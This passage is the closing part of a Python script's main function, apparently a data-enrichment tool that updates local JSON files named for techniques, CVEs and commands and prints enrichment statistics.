                        "techniques.json": enricher._enrich_techniques,
                        "cves.json": enricher._enrich_cves,
                    }
                    fn = enricher_map.get(target, enricher._enrich_commands)
                    result = fn(data)
                    with open(fpath, "w", encoding="utf-8") as f:
                        json.dump(result, f, indent=1, ensure_ascii=False, default=str)
                    print(f"Enriched {target}: {len(data)} → {len(result)} entries")
            else:
                print(f"File not found: {fpath}")
            return

    # Full enrichment
    stats = enricher.enrich_all()
    print(f"\nEnrichment stats: {json.dumps(stats, indent=2)}")


if __name__ == "__main__":
    main()
